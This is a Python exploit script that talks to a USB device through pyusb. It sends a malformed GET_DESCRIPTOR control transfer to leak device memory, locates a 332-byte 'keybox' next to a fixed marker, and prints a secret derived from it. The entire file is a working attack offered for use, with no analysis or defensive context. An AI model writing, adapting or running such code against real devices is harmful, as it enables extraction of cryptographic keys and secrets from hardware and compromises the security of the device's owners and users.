import usb.core
import argparse

from derive_secret import derive_secret


class Exploit:

    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--vid', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--pid', type=lambda x: int(x, 16), required=True)
        self.args = parser.parse_args()

    def run(self):
        self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)
        if self.dev is None:
            raise RuntimeError("cannot find device with VID={:04X} PID={:04X}".format(self.args.vid, self.args.pid))

        first = bytearray(self.dev.ctrl_transfer(0x80, 0x06, 0x0303, 0x00, 32))
        second = bytearray(self.dev.ctrl_transfer(0x80, 0x06, 0xFFFF, 0x00, 0xF00))

        print("First: {}".format(first.hex()))
        print("Second: {}".format(second.hex()))

        magic = bytes.fromhex("00 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF")
        if magic in second:
            x = second.find(magic)
            keybox = second[x - 332:x]
            print("-" * 80)
            print("Secret: {}".format(derive_secret(keybox).hex()))


def main():
    e = Exploit()
    e.run()


if __name__ == "__main__":
    main()
